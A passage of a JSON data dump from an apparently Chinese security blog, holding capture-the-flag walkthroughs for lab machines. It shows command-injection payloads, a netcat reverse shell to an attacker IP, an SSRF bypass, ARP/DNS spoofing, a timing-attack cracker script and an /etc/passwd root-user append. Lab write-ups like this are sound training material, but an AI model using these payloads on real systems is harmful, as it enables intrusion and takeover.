**\u56db\u3001\u593a\u53d6\u65d7\u5e1c**\n\n\u4f7f\u7528\u7834\u89e3\u51fa\u7684\u5bc6\u7801\u5207\u6362\u5230 `root` \u7528\u6237\u3002\n\n```bash\nblack@Tea:/tmp$ su -\nPassword: toddzhennb\nroot@Tea:~# id\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n\u6700\u540e\uff0c\u8bfb\u53d6 flag\uff0c\u5b8c\u6210\u6e17\u900f\u3002\n\n```bash\nroot@Tea:~# cat /root/root.txt /home/red/user.txt \nflag{root-06a5f218-4203-11f0-918d-000c2955ba04}\nflag{user-9667c39f-4203-11f0-9e29-000c2955ba04}\n```\n\n# \u4e94\u3001\u9898\u5916\u8bdd\n\n\u6211\u6253\u5b8c\u624d\u53d1\u73b0\uff0c\u8fd9\u9776\u673a\u7fa4\u4e3b\u53eb\u6211\u6d4b\u8bd5\u8fc7\n\n\u7136\u540e\u4ed6\u7684\u6839\u76ee\u5f55\u6709\u4e00\u4e2a\u811a\u672c\uff0c\u6bd4\u6211\u8fd9\u5feb\u591a\u4e86\uff0c\u60f3\u4e86\u89e3\u4e00\u4e0b\u7684\u770b\u4e0b\u9762\n\n```python\nroot@Tea:~# cat solve.py \nimport subprocess\nimport sys\nimport time\nimport string\n\nTARGET_PROGRAM = './a.out'\nMAX_LENGTH = 100\nINITIAL_DELAY = 0.2\nCHAR_DELAY = 0.05\nTIMING_MARGIN = 0.01\nATTEMPTS = 2\nDETECT_THRESHOLD = 0.15\nCHARSET = string.ascii_lowercase + string.digits\n\ndef run_password_test(password):\n    start_time = time.perf_counter()\n    process = subprocess.Popen(\n        [TARGET_PROGRAM, password],\n        stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE\n    )\n    _, _ = process.communicate()\n    return time.perf_counter() - start_time\n\ndef detect_length():\n    for length in range(1, MAX_LENGTH + 1):\n        test_pwd = 'a' * length\n        total_time = 0\n        for _ in range(ATTEMPTS):\n            elapsed = run_password_test(test_pwd)\n            total_time += elapsed\n        avg_time = total_time / ATTEMPTS\n        \n        if avg_time >= DETECT_THRESHOLD:\n            return length\n    \n    print('Password length not found (1-100)')\n    sys.exit(1)\n\ndef crack_password(password_length):\n    known = ''\n    \n    for position in range(password_length):\n        max_time = 0\n        best_char = None\n        \n        for char in CHARSET:\n            test_pwd = known + char + 'x' * (password_length - len(known) - 1)\n            \n            current_time = 0\n            for _ in range(ATTEMPTS):\n                elapsed = run_password_test(test_pwd)\n                if elapsed > current_time:\n                    current_time = elapsed\n            \n            print(f'Testing '{char}': {current_time:.4f}s')\n            \n            if current_time > max_time:\n                max_time = current_time\n                best_char = char\n        \n        expected_time = INITIAL_DELAY + (position + 1) * CHAR_DELAY\n        if abs(max_time - expected_time) > TIMING_MARGIN:\n            print(f'Warning: Position {position} timing anomaly ({max_time:.4f}s vs expected {expected_time:.4f}s)')\n        \n        known += best_char\n        print(f'Progress: {known}')\n    \n    return known\n\nif __name__ == '__main__':\n    print('Starting password cracker...')\n    print('Detecting password length...')\n    password_length = detect_length()\n    print(f'Password length detected: {password_length}')\n    password = crack_password(password_length)\n    print(f'\\nPassword found: {password}')\n```\n\nsentence", "top": 0, "createdAt": 1754441448, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-06", "dateLabelColor": "#0969da"}, "P185": {"htmlDir": "docs/post/nei-bu-_umz.html", "labels": ["HackMyVM", "\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_umz", "postUrl": "post/nei-bu-_umz.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/185", "commentNum": 0, "wordCount": 4262, "description": "\u9776\u673a\u5730\u5740\uff1ahttps://hackmyvm.eu/machines/machine.php?vm=Umz\n\n![image-20250804203716777](http://7r1UMPHK.github.io/image/20250804203743076.webp)\n\n# **\u4e00\u3001\u4fe1\u606f\u6536\u96c6**\n\n## 1. \u4e3b\u673a\u53d1\u73b0\n\n\u9996\u5148\uff0c\u5728\u672c\u5730\u7f51\u7edc\u4e2d\u4f7f\u7528 `arp-scan` \u5de5\u5177\u626b\u63cf\u5b58\u6d3b\u4e3b\u673a\uff0c\u786e\u5b9a\u76ee\u6807\u9776\u673a\u7684 IP \u5730\u5740\u4e3a `192.168.205.243`\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo arp-scan -l\n...\n192.168.205.243 08:00:27:9a:39:0d       PCS Systemtechnik GmbH\n...\n```\n\n## 2. \u7aef\u53e3\u4e0e\u670d\u52a1\u626b\u63cf\n\n\u4f7f\u7528 `nmap` \u5bf9\u76ee\u6807\u4e3b\u673a\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u53d1\u73b0\u5176\u521d\u59cb\u5f00\u653e\u4e86 22 (SSH) \u548c 80 (HTTP) \u4e24\u4e2a\u7aef\u53e3\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nmap -p- 192.168.205.243\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-04 08:37 EDT\nNmap scan report for 192.168.205.243\nHost is up (0.000099s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n```\n\n## 3. Web \u670d\u52a1\u63a2\u7d22\n\n\u8bbf\u95ee 80 \u7aef\u53e3\u662f\u4e00\u4e2a\u9759\u6001\u7f51\u9875\u3002\n\n![image-20250804203832718](http://7r1UMPHK.github.io/image/20250804203833086.webp)\n\n\u8fd9\u8d34\u8138\u5f00\u5927\uff0c\u5632\u8bbd\u6211\u4eecddos\u4e0d\u884c\u7684\uff0c\u5c31\u6ee1\u8db3\u4ed6\n\n```\ngobuster dir -k -t 200000 -u http://192.168.205.243 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip\n```\n\n\u626b\u63cf\u4e00\u6ce2\u5c31\u6302\u4e86\u3002\n\n\u91cd\u65b0\u8fdb\u884c\u7aef\u53e3\u626b\u63cf\u53d1\u73b0\uff0c\u670d\u52a1\u7aef\u53e3\u5df2\u4ece 80 \u5207\u6362\u5230\u4e86 8080\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nmap -p- 192.168.205.243\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-04 08:40 EDT\nNmap scan report for 192.168.205.243\nHost is up (0.000089s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n8080/tcp open  http-proxy\n```\n\n\u8bbf\u95ee `http://192.168.205.243:8080`\uff0c\u53d1\u73b0\u4e00\u4e2a\u767b\u5f55\u9875\u9762\u3002\n\n# **\u4e8c\u3001\u521d\u59cb\u8bbf\u95ee**\n\n## 1. \u6f0f\u6d1e\u5229\u7528\n\n\u5c1d\u8bd5\u4f7f\u7528\u5f31\u53e3\u4ee4 `admin:admin` \u6210\u529f\u767b\u5f55\u540e\u53f0\u3002\u540e\u53f0\u63d0\u4f9b\u4e00\u4e2a `ping` \u529f\u80fd\uff0c\u6d4b\u8bd5\u53d1\u73b0\u5b58\u5728\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\u3002\u901a\u8fc7\u4f7f\u7528\u5206\u53f7 `;` \u53ef\u4ee5\u62fc\u63a5\u5e76\u6267\u884c\u4efb\u610f\u7cfb\u7edf\u547d\u4ee4\u3002\n\n```text\nPayload: ; id\n```\n\n## 2. \u83b7\u53d6 Shell\n\n\u5229\u7528\u8be5\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\uff0c\u6267\u884c\u53cd\u5411 Shell \u547d\u4ee4\uff0c\u6210\u529f\u5728\u672c\u5730 Kali \u76d1\u542c\u7684\u7aef\u53e3\u4e0a\u63a5\u6536\u5230 Shell\u3002\n\n*   **\u653b\u51fb\u673a\uff08Kali\uff09\u76d1\u542c:**\n    ```bash\n    \u250c\u2500\u2500(kali\u327fkali)-[~]\n    \u2514\u2500$ nc -lvnp 8888\n    listening on [any] 8888 ...\n    ```\n\n*   **Web \u9875\u9762\u6ce8\u5165 Payload:**\n    ```text\n    ;busybox nc 192.168.205.128 8888 -e /bin/bash\n    ```\n\n\u6210\u529f\u83b7\u53d6 `welcome` \u7528\u6237\u7684 Shell\u3002\u4e3a\u65b9\u4fbf\u540e\u7eed\u64cd\u4f5c\uff0c\u4f7f\u7528 `stty` \u5c06\u5176\u5347\u7ea7\u4e3a\u529f\u80fd\u5b8c\u6574\u7684\u4ea4\u4e92\u5f0f TTY\u3002\n\n```bash\n# \u7a33\u5b9a Shell\nscript /dev/null -c bash\nCtrl+Z\nstty raw -echo; fg\nreset xterm\nexport TERM=xterm\nexport SHELL=/bin/bash\nstty rows 34 columns 120\n```\n\n\u8fdb\u5165 `welcome` \u7528\u6237\u5bb6\u76ee\u5f55\uff0c\u8bfb\u53d6\u7b2c\u4e00\u4e2a flag\u3002\n\n```bash\nwelcome@Umz:~$ cat /home/welcome/user.txt\nflag{user-4483f72525b3c316704cf126bec02d5c}\n```\n\n# **\u4e09\u3001\u6743\u9650\u63d0\u5347**\n\n## 1. \u6a2a\u5411\u79fb\u52a8: welcome -> umzyyds\n\n\u9996\u5148\uff0c\u68c0\u67e5\u5f53\u524d\u7528\u6237\u7684 `sudo` \u6743\u9650\uff0c\u53d1\u73b0 `welcome` \u7528\u6237\u53ef\u4ee5\u514d\u5bc6\u6267\u884c `/usr/bin/md5sum`\u3002\n\n```bash\nwelcome@Umz:~$ sudo -l\nUser welcome may run the following commands on Umz:\n    (ALL) NOPASSWD: /usr/bin/md5sum\n```\n\n\u5728\u7cfb\u7edf\u4e2d\u8fdb\u884c\u679a\u4e3e\uff0c\u4e8e `/opt/flask-debug/` \u76ee\u5f55\u4e0b\u53d1\u73b0\u4e00\u4e2a\u540d\u4e3a `umz.pass` \u7684\u654f\u611f\u6587\u4ef6\u3002\u4f7f\u7528 `sudo` \u6743\u9650\u8bfb\u53d6\u5176 MD5 \u54c8\u5e0c\u503c\u3002\n\n```bash\nwelcome@Umz:/opt/flask-debug$ sudo /usr/bin/md5sum umz.pass\na963fadd7fd379f9bc294ad0ba44f659  umz.pass\n```\n\n\u5c1d\u8bd5\u4f7f\u7528 `john` \u7206\u7834\u8be5\u54c8\u5e0c\u503c\u672a\u679c\u3002\u8003\u8651\u5230 Linux \u6587\u4ef6\u5e38\u4ee5\u6362\u884c\u7b26 `\\n` \u7ed3\u5c3e\uff0c\u8fd9\u53ef\u80fd\u4f1a\u5f71\u54cd\u54c8\u5e0c\u8ba1\u7b97\u3002\u4f7f\u7528 `perl` \u811a\u672c\u7ed3\u5408 `rockyou.txt` \u5b57\u5178\uff0c\u5728\u8ba1\u7b97\u54c8\u5e0c\u65f6\u5305\u542b\u6362\u884c\u7b26\uff0c\u6210\u529f\u7834\u89e3\u51fa\u5bc6\u7801\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ perl -MDigest::MD5=md5_hex -nE 'print $_ if md5_hex($_) eq 'a963fadd7fd379f9bc294ad0ba44f659'' /usr/share/wordlists/rockyou.txt\nsunshine3\n```\n\n\u5bc6\u7801\u4e3a `sunshine3`\u3002\u901a\u8fc7 `ls /home` \u53d1\u73b0\u5b58\u5728\u53e6\u4e00\u4e2a\u7528\u6237 `umzyyds`\u3002\u4f7f\u7528\u7834\u89e3\u51fa\u7684\u5bc6\u7801\u6210\u529f\u5207\u6362\u5230 `umzyyds` \u7528\u6237\u3002\n\n```bash\nwelcome@Umz:~$ su umzyyds\nPassword: sunshine3\numzyyds@Umz:/home/welcome$\n```\n\n## 2. \u5782\u76f4\u63d0\u5347: umzyyds -> root\n\n\u5207\u6362\u5230 `umzyyds` \u7528\u6237\u540e\uff0c\u5728\u5176\u5bb6\u76ee\u5f55\u4e2d\u53d1\u73b0\u4e00\u4e2a\u62e5\u6709 `SUID` \u6743\u9650\u7684\u53ef\u6267\u884c\u6587\u4ef6 `Dashazi`\u3002\n\n```bash\numzyyds@Umz:~$ ls -al\n...\n-rwsr-sr-x 1 root    root    76712 May  3 10:42 Dashazi\n...\n```\n\n\u4f7f\u7528 `strings` \u547d\u4ee4\u5206\u6790\u8be5\u6587\u4ef6\uff0c\u53d1\u73b0\u5176\u5305\u542b\u4e86\u5927\u91cf\u4e0e `dd` \u547d\u4ee4\u76f8\u5173\u7684\u5b57\u7b26\u4e32\uff0c\u53ef\u4ee5\u65ad\u5b9a `Dashazi` \u5c31\u662f `dd` \u547d\u4ee4\u7684\u526f\u672c\u3002\n\n\u7531\u4e8e\u8be5\u6587\u4ef6\u5177\u6709 SUID root \u6743\u9650\uff0c\u4efb\u4f55\u7528\u6237\u6267\u884c\u5b83\u65f6\u90fd\u5c06\u83b7\u5f97 root \u8eab\u4efd\u3002\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u5b83\u4ee5 root \u6743\u9650\u5199\u5165\u7cfb\u7edf\u5173\u952e\u6587\u4ef6\uff0c\u5982 `/etc/passwd`\uff0c\u4ece\u800c\u521b\u5efa\u4e00\u4e2a\u65b0\u7684 root \u7528\u6237\u3002\n\n**\u63d0\u6743\u6b65\u9aa4:**\n\n1.  \u6784\u9020\u4e00\u4e2a\u65b0\u7684\u7528\u6237\u6761\u76ee\uff0c\u7528\u6237\u540d\u4e3a `b`\uff0c\u5bc6\u7801\u4e3a`abcdefg`\uff0cUID \u548c GID \u5747\u4e3a `0` (root \u6743\u9650)\u3002\n2.  \u4f7f\u7528 `echo` \u548c\u7ba1\u9053\uff0c\u5c06\u8be5\u6761\u76ee\u4f5c\u4e3a `Dashazi` (dd) \u7684\u8f93\u5165\u3002\n3.  \u6307\u5b9a\u8f93\u51fa\u6587\u4ef6 (`of`) \u4e3a `/etc/passwd`\uff0c\u5e76\u4f7f\u7528 `oflag=append` \u548c `conv=notrunc` \u9009\u9879\u4ee5\u8ffd\u52a0\u6a21\u5f0f\u5199\u5165\uff0c\u907f\u514d\u8986\u76d6\u539f\u6587\u4ef6\u3002\n\n```bash\numzyyds@Umz:~$ echo 'b:$1$AydoDDh4$tEky6m30.0nY3HZ8FgoGI0:0:0::/root:/bin/bash' | ./Dashazi of=/etc/passwd conv=notrunc oflag=append\n0+1 records in\n0+1 records out\n37 bytes copied, 0.000106 s, 349 kB/s\n```\n\n# **\u56db\u3001\u593a\u53d6\u65d7\u5e1c**\n\n\u6210\u529f\u5411 `/etc/passwd` \u6587\u4ef6\u4e2d\u6dfb\u52a0\u4e86\u65b0\u7684 root \u7528\u6237 `hacker` \u540e\uff0c\u76f4\u63a5\u5207\u6362\u5230\u8be5\u7528\u6237\uff0c\u5373\u53ef\u83b7\u5f97 root \u6743\u9650\u3002\n\n```bash\numzyyds@Umz:~$ su b\nPassword:\nroot@Umz:/home/umzyyds# id\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n\u6700\u540e\uff0c\u8bfb\u53d6 `root.txt` \u83b7\u53d6\u6700\u7ec8\u7684 flag\uff0c\u5b8c\u6210\u6e17\u900f\u3002\n\n```bash\nroot@Umz:/home/umzyyds# cat /root/root.txt /home/welcome/user.txt \nflag{root-a73c45107081c08dd4560206b8ef8205}\nflag{user-4483f72525b3c316704cf126bec02d5c}\n```sentence", "top": 0, "createdAt": 1754441474, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-06", "dateLabelColor": "#0969da"}, "P186": {"htmlDir": "docs/post/nei-bu-_Open.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_Open", "postUrl": "post/nei-bu-_Open.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/186", "commentNum": 0, "wordCount": 6133, "description": "![image-20250803185538640](http://7r1UMPHK.github.io/image/20250803185538981.webp)\n\n# **\u4e00\u3001\u4fe1\u606f\u6536\u96c6**\n\n## 1. \u4e3b\u673a\u53d1\u73b0\n\n\u4f7f\u7528 `arp-scan` \u5728\u672c\u5730\u7f51\u7edc\u8fdb\u884c\u626b\u63cf\uff0c\u53d1\u73b0\u76ee\u6807\u4e3b\u673a IP \u5730\u5740\u4e3a `192.168.205.239`\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo arp-scan -l\n...\n192.168.205.239 08:00:27:3b:0f:b3       (Unknown)\n...\n```\n\n## 2. \u7aef\u53e3\u4e0e\u670d\u52a1\u626b\u63cf\n\n\u901a\u8fc7 `nmap` \u5bf9\u76ee\u6807\u4e3b\u673a\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u786e\u8ba4\u5176\u5f00\u653e\u4e86 22 (SSH) \u548c 80 (HTTP) \u7aef\u53e3\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nmap -p- 192.168.205.239\n...\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n```\n\n## 3. Web \u670d\u52a1\u4fa6\u5bdf\n\n\u76f4\u63a5\u8bbf\u95ee\u76ee\u6807 IP \u4f1a\u81ea\u52a8\u91cd\u5b9a\u5411\u5230\u57df\u540d `open.dsz`\u3002\u56e0\u6b64\uff0c\u9996\u5148\u5728\u653b\u51fb\u673a\u4e0a\u914d\u7f6e `/etc/hosts` \u6587\u4ef6\uff0c\u5c06\u8be5\u57df\u540d\u6307\u5411\u76ee\u6807 IP\u3002\n\n```bash\n# /etc/hosts \u6587\u4ef6\u4e2d\u6dfb\u52a0\n192.168.205.239 open.dsz\n```\n\n\u63a5\u7740\u4f7f\u7528 `gobuster` \u8fdb\u884c\u76ee\u5f55\u679a\u4e3e\uff0c\u53d1\u73b0\u4e86 `info.txt` \u548c `info.php` \u6587\u4ef6\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ gobuster dir -u http://open.dsz -w ...\n...\n/index.php            (Status: 200)\n/info.txt             (Status: 200)\n/info.php             (Status: 200)\n...\n```\n\n\u67e5\u770b `info.txt` \u7684\u5185\u5bb9\u53d1\u73b0\u5b83\u5305\u542b PHP \u4ee3\u7801\uff0c\u8fd9\u6697\u793a\u670d\u52a1\u5668\u53ef\u80fd\u5b58\u5728\u6587\u4ef6\u5305\u542b\u6216\u89e3\u6790\u6f0f\u6d1e\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl http://open.dsz/info.txt              \n<?php phpinfo();?>\n```\n\n# **\u4e8c\u3001\u521d\u59cb\u8bbf\u95ee**\n\n## Web \u6e17\u900f (SSRF)\n\n\u7f51\u7ad9\u4e3b\u9875\u63d0\u4f9b\u4e86\u4e00\u4e2a\u529f\u80fd\uff0c\u5141\u8bb8\u901a\u8fc7 URL \u53c2\u6570 `?url=` \u6765\u52a0\u8f7d\u6307\u5b9a\u7684\u9875\u9762\u3002\n\n![image-20250803190055070](http://7r1UMPHK.github.io/image/20250803190055290.webp)\n\n\u7ecf\u8fc7\u6d4b\u8bd5\uff0c\u53d1\u73b0\u540e\u7aef\u5bf9 URL \u8fdb\u884c\u4e86\u9650\u5236\uff0c\u53ea\u5141\u8bb8\u52a0\u8f7d\u4ee5 `http://open` \u5f00\u5934\u7684\u5730\u5740\uff0c\u5e76\u4e14\u4f1a\u89e3\u6790`info.txt `\uff0c\u90a3\u5c31\u6709\u4e00\u4e2a\u4f5c\u5f0a\u7684\u65b9\u6cd5\n\n```bash\nsudo bettercap\nset arp.spoof.targets 192.168.205.239\nset dns.spoof.domains http://open.cnm\nset dns.spoof.address 192.168.205.128\narp.spoof on\ndns.spoof on\n```\n\nDNS\u52ab\u6301,\u7136\u540e\u6302\u4e00\u4e2a\u53cd\u5f39shell\u670d\u52a1\n\n\u5f53\u7136\u8fd9\u662f\u4f5c\u5f0a\u7684\u65b9\u6cd5\uff0c\u6b63\u5e38\u7684\u601d\u8def\u662f\u8fd9\u4e2a\u8fc7\u6ee4\u673a\u5236\u53ef\u4ee5\u901a\u8fc7\u5728 URL \u4e2d\u4f7f\u7528 `@` \u7b26\u53f7\u6765\u7ed5\u8fc7\uff0c\u8fd9\u662f\u4e00\u79cd\u5178\u578b\u7684\u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020 (SSRF) \u6f0f\u6d1e\u3002\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6b64\u6f0f\u6d1e\uff0c\u4f7f\u670d\u52a1\u5668\u8bf7\u6c42\u5e76\u6267\u884c\u6211\u4eec\u6258\u7ba1\u7684\u6076\u610f\u6587\u4ef6\u3002\n\n**\u653b\u51fb\u6b65\u9aa4:**\n1.  \u5728\u653b\u51fb\u673a (Kali) \u4e0a\u521b\u5efa\u4e00\u4e2a\u53cd\u5f39 shell \u7684 PHP \u6587\u4ef6 (`reverse.php`)\u3002\n2.  \u5728\u653b\u51fb\u673a\u4e0a\u5f00\u542f\u4e00\u4e2a\u4e34\u65f6\u7684 HTTP \u670d\u52a1\u5668\u3002\n3.  \u6784\u9020\u6076\u610f\u7684 URL\uff0c\u5229\u7528 `@` \u7b26\u53f7\u7ed5\u8fc7\u4e3b\u673a\u9a8c\u8bc1\uff0c\u5e76\u6307\u5411\u653b\u51fb\u673a\u4e0a\u7684\u53cd\u5f39 shell \u6587\u4ef6\u3002\n4.  \u5728 Kali \u4e0a\u5f00\u542f `netcat` \u76d1\u542c\u3002\n\n**\u6076\u610f URL:**\n```\nhttp://open.dsz/?url=http://open.dsz@192.168.205.128/reverse.php\n```\n\n\u8bbf\u95ee\u4e0a\u8ff0 URL \u540e\uff0c\u6210\u529f\u5728\u672c\u5730 `netcat` \u76d1\u542c\u5668\u4e0a\u63a5\u6536\u5230\u4e86\u6765\u81ea\u76ee\u6807\u670d\u52a1\u5668\u7684 `www-data` \u7528\u6237\u53cd\u5f39 shell\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nc -lvnp 8888       \nlistening on [any] 8888 ...\nconnect to [192.168.205.128] from (UNKNOWN) [192.168.205.239] 45778\n...\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\n# **\u4e09\u3001\u6743\u9650\u63d0\u5347**\n\n## 1. \u4ece `www-data` \u5230 `miao`\n\n\u83b7\u53d6\u521d\u59cb shell \u540e\uff0c\u5728 `/home` \u76ee\u5f55\u4e0b\u53d1\u73b0\u4e86 `giao`, `miao`, `xiao` \u4e09\u4e2a\u7528\u6237\u3002\u5728 `/opt` \u76ee\u5f55\u4e2d\uff0c\u53d1\u73b0\u4e86\u4e00\u4e2a\u5177\u6709 SUID \u6743\u9650\u7684\u53ef\u6267\u884c\u6587\u4ef6 `echo`\u3002\n\n```bash\nwww-data@Open:/opt$ ls -al\n...\n-rwsr-sr-x  1 root root 17008 Jul 29 03:06 echo\n...\n```\n\n\u901a\u8fc7\u9006\u5411\u5206\u6790`echo` \u6587\u4ef6\uff0c\u53d1\u73b0\u5b83\u5b58\u5728\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\u3002\n\n```c\nint __fastcall main(int argc, const char **argv, const char **envp)\n{\n  char v4[2]; // [rsp+1Eh] [rbp-232h] BYREF\n  _QWORD v5[2]; // [rsp+20h] [rbp-230h] BYREF\n  int v6; // [rsp+30h] [rbp-220h]\n  char v7[8]; // [rsp+34h] [rbp-21Ch] BYREF\n  char dest[524]; // [rsp+40h] [rbp-210h] BYREF\n  int v9; // [rsp+24Ch] [rbp-4h]\n\n  if ( setgid(0x3E8u) || setuid(0x3E8u) )\n  {\n    fwrite('\u93c9\u51ae\u6aba\u7481\u5267\u7586\u6fb6\u8fab\u89e6\\n', 1uLL, 0x13uLL, stderr);\n    return 1;\n  }\n  else if ( argc > 1 )\n  {\n    v5[0] = 0xE75B27206F686365LL;\n    v5[1] = 0x93BEE8B788E6A894LL;\n    v6 = 1571128805;\n    strcpy(v7, ': ');\n    strcpy(v4, ''');\n    strcpy(dest, (const char *)v5);\n    strcat(dest, argv[1]);\n    strcat(dest, v4);\n    printf(asc_2047, dest);\n    v9 = system(dest);\n    if ( v9 == -1 )\n    {\n      perror(s);\n      return 1;\n    }\n    else\n    {\n      return 0;\n    }\n  }\n  else\n  {\n    printf('\u6d63\u8de8\u6564\u93c2\u89c4\u7876: %s \\'\u7455\u4f78\u6d16\u93c4\u5267\u6b91\u5a11\u581f\u4f05\\'\\n', *argv);\n    return 1;\n  }\n}\n```\n\n\u8be5\u7a0b\u5e8f\u4f1a\u5c06\u5176\u83b7\u53d6\u7684\u547d\u4ee4\u884c\u53c2\u6570\u76f4\u63a5\u62fc\u63a5\u5230\u4e00\u4e2a\u7cfb\u7edf\u547d\u4ee4\u5b57\u7b26\u4e32\u4e2d\u5e76\u6267\u884c\uff0c\u5e76\u4e14\u4f1a\u4ee5\u7528\u6237 `miao` (UID 1000) \u7684\u6743\u9650\u8fd0\u884c\u3002\n\n\u5229\u7528\u6b64\u6f0f\u6d1e\uff0c\u901a\u8fc7\u6ce8\u5165 `bash -p` \u547d\u4ee4\uff0c\u6211\u4eec\u6210\u529f\u83b7\u5f97\u4e86\u4e00\u4e2a\u62e5\u6709 `miao` \u7528\u6237\u6743\u9650\u7684 shell\u3002\n\n```bash\nwww-data@Open:/opt$ ./echo ''; id; whoami #'\n\u6267\u884c\u547d\u4ee4: echo '[\u7528\u6237\u8f93\u5165]: '; id; whoami #'\n[\u7528\u6237\u8f93\u5165]: \nuid=1000(miao) gid=1000(miao) groups=1000(miao),33(www-data)\nmiao\n\nwww-data@Open:/opt$ ./echo ''; bash -p #'\n\u6267\u884c\u547d\u4ee4: echo '[\u7528\u6237\u8f93\u5165]: '; bash -p #'\n[\u7528\u6237\u8f93\u5165]: \nmiao@Open:/opt$ id\nuid=1000(miao) gid=1000(miao) groups=1000(miao),33(www-data)\n```\n\n\u540c\u65f6\uff0c\u5728 `miao` \u7684\u5bb6\u76ee\u5f55\u4e0b\uff0c\u627e\u5230\u4e86\u7b2c\u4e00\u4e2a flag \u6587\u4ef6 `user.txt`\u3002\n\n```bash\nmiao@Open:/opt$ cat /home/miao/user.txt \nflag{user-b026324c6904b2a9cb4b88d6d61c81d1}\n```\n\n#### 2. \u4ece `miao` \u5230 `root`\n\n\u6210\u4e3a `miao` \u7528\u6237\u540e\uff0c\u6267\u884c `sudo -l` \u53d1\u73b0\u8be5\u7528\u6237\u53ef\u4ee5\u65e0\u5bc6\u7801\u6267\u884c `/opt/hello.sh` \u811a\u672c\u3002\n\n```bash\nmiao@Open:/opt$ sudo -l\n...\nUser miao may run the following commands on Open:\n    (ALL) NOPASSWD: /opt/hello.sh\n```\n\n\u67e5\u770b\u8be5\u811a\u672c\u5185\u5bb9\uff0c\u53d1\u73b0\u5b83\u5bf9\u8f93\u5165\u53c2\u6570 'dsz' \u505a\u4e86\u5224\u65ad\u3002\u5982\u679c\u53c2\u6570\u5b8c\u5168\u7b49\u4e8e 'dsz'\uff0c\u811a\u672c\u4f1a\u76f4\u63a5\u9000\u51fa\u3002\u7136\u800c\uff0c\u811a\u672c\u4f7f\u7528\u4e86 `[ $1 = 'dsz' ]` \u8fd9\u79cd\u4e0d\u4e25\u8c28\u7684\u5224\u65ad\u65b9\u5f0f\u3002\n\n```bash\nmiao@Open:/opt$ cat hello.sh \nPATH=/usr/bin\n[ -n '$1' ] || exit 1\n[ '$1' = 'dsz' ] && exit 2\n#[ $1 = 'dsz' ] && cat /root/password.txt | md5sum | awk '{print $1}'\n[ $1 = 'dsz' ] && cat /root/password.txt\necho 'Goodbye!'\n```\n\n\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 `bash` \u7684\u901a\u914d\u7b26\u6269\u5c55\uff08globbing\uff09\u6765\u7ed5\u8fc7\u8fd9\u4e2a\u68c0\u67e5\u3002\n1.  \u5728 `/tmp` \u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a `'dsz '`\uff08\u6ce8\u610f\u672b\u5c3e\u6709\u7a7a\u683c\uff09\u7684\u6587\u4ef6\u3002\n2.  \u6267\u884c `sudo /opt/hello.sh *`\uff0c\u6b64\u65f6 `*` \u4f1a\u88ab shell \u6269\u5c55\u4e3a\u6587\u4ef6\u540d `'dsz '`\uff0c\u4ece\u800c\u7ed5\u8fc7\u4e86 `[ '$1' = 'dsz' ]` \u7684\u68c0\u67e5\uff0c\u5e76\u6210\u529f\u6267\u884c\u4e86 `cat /root/password.txt` \u547d\u4ee4\u3002\n\n```bash\nmiao@Open:/tmp$ touch 'dsz '\nmiao@Open:/tmp$ sudo /opt/hello.sh *\n6cd1f22e65d26246530ff7a2528144e3\nGoodbye!\n```\n\n\u6211\u4eec\u5f97\u5230\u4e86\u4e00\u4e2a MD5 \u54c8\u5e0c\u3002\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u811a\u672c\u4e2d\u83b7\u53d6\u54c8\u5e0c\u7684\u65b9\u5f0f\u662f `cat /root/password.txt | 